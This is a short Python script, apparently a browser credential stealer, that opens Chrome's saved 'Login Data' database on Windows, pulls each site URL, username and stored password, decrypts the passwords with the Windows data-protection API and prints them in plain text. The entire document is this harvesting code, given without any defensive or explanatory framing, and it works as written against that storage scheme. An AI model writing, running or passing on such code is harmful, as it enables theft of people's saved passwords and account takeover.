import sqlite3
import os
import win32crypt

db_path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
	try:
		password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
		if password:
			print(result[0])
			print(result[1])
			print(password.decode('utf-8'))
			print()
	except:
		pass